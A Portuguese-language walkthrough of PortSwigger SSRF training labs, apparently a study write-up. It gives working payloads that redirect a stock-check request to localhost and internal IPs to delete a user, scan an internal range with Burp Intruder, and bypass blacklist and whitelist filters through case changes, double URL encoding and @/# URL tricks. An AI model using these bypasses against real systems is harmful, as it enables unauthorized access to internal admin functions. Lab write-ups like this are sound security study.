---
title: "PortSwigger - Server-side Request Forgery (SSRF)"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de Server-side Request Forgery (SSRF) da PortSwigger"
keywords: ["PortSwigger", "SSRF", "Server-side Request Forgery", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Basic SSRF against the local server
 "This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. "

Após interceptar e decodificar a requisição para "stock check", observamos que ela é realizada para a seguinte URL: 
```
http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```
Modificando a url para: `http://localhost/admin`, temos acesso ao painel de administrador. Porém, ainda não é possível deletar a conta de "carlos", pois seria necessário estar autenticado como "admin". A fim de contornar esse problema, fazemos a seguinte substituição no corpo da requisição de "stock check": 
```
stockApi=http://localhost/admin/delete?username=carlos
```

## Lab: Basic SSRF against another back-end system
"This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. "

Será a mesma ideia do desafio anterior, mas utilizaremos o Burp Intruder para encontrar o IP correto.
Encontramos a URL original: `http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1`
Modificamos para: 
`http://192.168.0.$$:8080/admin` e descobrimos o IP disponível: 192.168.0.43. Após isso, basta modificar a URL para a deleção do usuário "carlos" que aparece na página do admin.

## Lab: SSRF with blacklist-based input filter
"This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. "

A substituição da url original da requisição por `http://localhost/admin` é detectada. Recebemos a resposta: 
```
HTTP/2 400 Bad Request
[...]

"External stock check blocked for security reasons"
```
Para descobrir de forma mais efetiva qual tipo de vulnerabilidade a blacklist deixa passar, iremos usar a URL original. 
```
http://stock.weliketoshop.net:8080/stock/check?productId=3&storeId=1
```
Com `localhost`, a resposta é 400.
```
http://stock.weliketoshop.net@localhost:8080/stock/check?productId=3&storeId=1
```
Porém, inserindo `Localhost` no lugar de `localhost`, a resposta é `Internal Server Error`, indicando uma brecha com variação de case.
Já para a palavra `admin`, devemos aplicar um URL encoding duas vezes.
Resultado: `http%3a//stock.weliketoshop.net%40Localhost/%2561%2564%256d%2569%256e/`
Com isso, basta colocar no fim da url a remoção do "carlos": `http%3a//stock.weliketoshop.net%40Localhost/%2561%2564%256d%2569%256e/delete?username=carlos`

## Lab: SSRF with filter bypass via open redirection vulnerability
" This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. "

Observa-se a vulnerabilidade de open redirect na funcionalidade de "next product". 
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 
```

## Lab: SSRF with whitelist-based input filter
"This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass."

Testando a URL original `http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=1`, apagando aos poucos cada campo e restando apenas `http://stock.weliketoshop`, recebemos a resposta:
```
HTTP/2 400 Bad Request
[...]

"External stock check host must be stock.weliketoshop.net"
```
Portanto, podemos assumir que a whitelist é aplicada sobre `stock.weliketoshop.net`
Testes:
`http://stock.weliketoshop.net:8080#@localhost/admin`
Entende como stock.weliketoshop.net e retorna "Missing parameter"

`http://stock.weliketoshop.net:8080@localhost/admin`
Filtra hostname como localhost. Provavelmente faz uso de lib, não busca explícita por string.
